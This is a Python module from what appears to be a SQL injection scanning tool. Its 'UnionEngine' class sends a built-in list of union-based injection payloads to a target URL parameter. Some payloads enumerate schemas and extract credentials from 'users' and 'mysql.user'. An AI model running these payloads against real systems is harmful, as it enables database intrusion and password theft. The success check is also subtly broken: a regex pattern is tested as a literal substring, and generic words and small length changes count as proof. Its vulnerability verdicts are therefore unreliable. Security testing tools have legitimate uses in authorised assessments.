"""
Union-Based SQL Injection Engine
"""

import os
from utils.http_client import HttpClient
from config import MAX_PAYLOADS_PER_TEST, SKIP_DUPLICATE_PAYLOADS, NORMALIZE_PAYLOADS, SMART_PAYLOAD_ORDERING

class UnionEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "union_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load union-based payloads from file with smart handling"""
        default_payloads = [
            # Basic union payloads
            "' UNION SELECT null--", "' UNION SELECT 1--", "' UNION SELECT 1,2--", 
            "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
            
            # Union with version detection
            "' UNION SELECT @@version--", "' UNION SELECT version()--", 
            "' UNION SELECT null,@@version--", "' UNION SELECT null,version()--",
            
            # Union with database info
            "' UNION SELECT database()--", "' UNION SELECT null,database()--",
            "' UNION SELECT user()--", "' UNION SELECT null,user()--",
            "' UNION SELECT current_user--", "' UNION SELECT null,current_user--",
            
            # Union with table enumeration
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT null,table_name FROM information_schema.tables--",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables--",
            
            # Union with column enumeration
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT null,column_name FROM information_schema.columns--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            
            # Union with data extraction
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT null,concat(username,':',password) FROM users--",
            "' UNION SELECT null,concat(user,':',password) FROM mysql.user--",
            
            # Alternative comment syntax
            "' UNION SELECT 1#", "' UNION SELECT 1,2#", "' UNION SELECT 1,2,3#",
            "' UNION SELECT null/*", "' UNION SELECT 1/*", "' UNION SELECT 1,2/*",
            
            # With different quote types
            "\" UNION SELECT 1--", "\" UNION SELECT 1,2--",
            "') UNION SELECT 1--", "') UNION SELECT 1,2--",
            "') UNION SELECT 1,2,3--",
            
            # Advanced union techniques
            "' UNION ALL SELECT 1--", "' UNION ALL SELECT 1,2--",
            "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--",
            "' UNION SELECT 1 FROM information_schema.tables--"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                # Normalize payloads if enabled
                if NORMALIZE_PAYLOADS:
                    payloads = [' '.join(p.split()) for p in payloads]
                
                # Remove duplicates if enabled
                if SKIP_DUPLICATE_PAYLOADS:
                    payloads = list(dict.fromkeys(payloads))
                
                # Smart ordering
                if SMART_PAYLOAD_ORDERING:
                    payloads = self._order_payloads(payloads)
                
                # Apply limit if specified
                if MAX_PAYLOADS_PER_TEST:
                    payloads = payloads[:MAX_PAYLOADS_PER_TEST]
                
                print(f"   Loaded {len(payloads)} unique union payloads")
                return payloads
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def _order_payloads(self, payloads):
        """Order payloads by column count (fewer columns first)"""
        def column_count(payload):
            # Count commas to estimate column count
            return payload.count(',')
        
        return sorted(payloads, key=column_count)
    
    def test(self, param, url):
        """Test for union-based SQL injection"""
        try:
            baseline_response = self.http_client.get(url, {param: "1"})
            
            for payload in self.payloads:
                try:
                    response = self.http_client.get(url, {param: f"1{payload}"})
                    
                    if not response:
                        continue
                    
                    # Check for union success indicators
                    if self._detect_union_success(response, baseline_response):
                        return {
                            "vulnerable": True,
                            "payload": payload, 
                            "response": response,
                            "evidence": "Union query executed successfully - database information exposed"
                        }
                        
                except Exception as e:
                    continue
            
            return None
        except Exception as e:
            print(f"   Union test error: {e}")
            return None
    
    def _detect_union_success(self, response, baseline_response):
        """Detect successful union injection with enhanced pattern matching"""
        if not response:
            return False
            
        # Expanded error/success indicators for union-based injections
        union_indicators = [
            # Common database identifiers that appear in union results
            "mysql", "mariadb", "5.7", "5.6", "8.0", "10.",  # Version numbers
            "root@", "admin", "user@",  # User indicators
            
            # Error messages that indicate union syntax issues (helpful for column enumeration)
            "the used select statements have a different number of columns",
            "operand should contain", "column", "number",
            
            # Success indicators
            "mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
            "information_schema", "database()", "version()", "user()",
            
            # Database-specific patterns
            "ora-", "oracle", "microsoft ole db", "odbc driver",
            "sqlserver", "postgresql", "sqlite",
            
            # Table/column enumeration results
            "table_name", "column_name", "table_schema",
            "users", "accounts", "members", "passwords",
            
            # Generic SQL patterns
            "select", "from", "where", "union", "null"
        ]
        
        response_lower = response.lower()
        baseline_lower = baseline_response.lower() if baseline_response else ""
        
        # Count indicators in both responses
        response_indicators = sum(1 for ind in union_indicators if ind in response_lower)
        baseline_indicators = sum(1 for ind in union_indicators if ind in baseline_lower)
        
        # Check for significant difference in response length
        baseline_len = len(baseline_response) if baseline_response else 0
        response_len = len(response)
        
        length_diff = abs(baseline_len - response_len) > 50 if baseline_len > 0 else False
        
        # Check for visible data patterns (numbers, version strings, etc.)
        data_patterns = [
            r'\d+\.\d+',  # Version numbers like 5.7.33
            'localhost', 'root', 'admin',
            '127.0.0.1', 'debian'
        ]
        
        has_data_patterns = any(pattern.lower() in response_lower for pattern in data_patterns)
        
        # Multiple detection criteria
        indicator_increase = response_indicators > baseline_indicators + 1
        
        return indicator_increase or length_diff or has_data_patterns